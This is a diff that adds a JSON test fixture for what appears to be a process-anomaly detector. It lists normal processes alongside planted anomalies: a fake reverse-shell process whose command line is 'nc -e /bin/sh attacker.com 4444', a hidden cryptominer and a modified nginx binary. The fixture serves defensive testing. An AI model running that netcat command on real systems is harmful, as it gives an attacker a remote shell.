@@ -1,0 +1,13 @@
+{
+  "description": "Current state with anomalies for testing",
+  "processes": [
+    {"pid": 1, "name": "systemd", "exe": "/usr/lib/systemd/systemd", "ppid": 0, "username": "root", "exe_hash": "abc123"},
+    {"pid": 100, "name": "sshd", "exe": "/usr/sbin/sshd", "ppid": 1, "username": "root", "exe_hash": "def456"},
+    {"pid": 500, "name": "reverse_shell", "exe": "/tmp/rs.elf", "ppid": 100, "username": "www-data", "exe_hash": "malware1", "cmdline": "nc -e /bin/sh attacker.com 4444"},
+    {"pid": 501, "name": "cryptominer", "exe": "/dev/shm/.hidden/miner", "ppid": 1, "username": "nobody", "exe_hash": "malware2"},
+    {"pid": 200, "name": "nginx", "exe": "/usr/sbin/nginx", "ppid": 1, "username": "www-data", "exe_hash": "modified_hash"}
+  ],
+  "expected_new": ["reverse_shell", "cryptominer"],
+  "expected_missing": ["postgres"],
+  "expected_modified": ["nginx"]
+}
